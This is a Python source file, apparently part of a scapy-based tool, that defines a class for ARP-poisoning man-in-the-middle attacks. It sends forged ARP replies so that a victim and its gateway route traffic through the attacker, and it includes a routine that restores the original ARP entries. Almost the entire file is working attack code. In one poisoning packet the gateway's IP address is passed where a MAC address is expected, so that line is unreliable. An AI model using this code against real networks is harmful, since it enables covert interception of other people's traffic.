from scapy.all import *
from utils import *

class machine:
    ip      = ""
    mac     = ""
    gw      = None
    sniffer = None

    #at: attacker machine
    def mitm_poison(self, at):
        # op=2 means response
        at2vt = ARP(op=2, pdst=self.ip, hwdst=self.mac, psrc=self.gw.ip, hwsrc=at.mac)
        at2gw = ARP(op=2, pdst=self.gw.ip, hwdst=self.gw.ip, psrc=self.ip, hwsrc=at.mac)
        if DEBUG:
            print(at2vt.show())
            print(at2gw.show())
        send(at2vt, verbose=False)
        send(at2gw, verbose=False)
        
    def mitm_restore(self):
        vt2gw = ARP(op=2, pdst=self.gw.ip, hwdst=self.gw.mac, psrc=self.ip, hwsrc=self.mac)
        gw2vt = ARP(op=2, pdst=self.ip, hwdst=self.mac, psrc=self.gw.ip, hwsrc=self.gw.mac)
        if DEBUG:
            print(vt2gw.show())
            print(gw2vt.show())
        send(vt2gw, verbose=False)
        send(gw2vt, verbose=False)
    
    def __init__(self, ip, mac="", gw=None):
        self.ip = ip
        self.gw = gw
        if not mac:
            #dst="ff:ff:ff:ff:ff:ff": broadcast
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
            s, r = ans[0]
            if r.hwsrc:
                self.mac = r.hwsrc
        else: self.mac = mac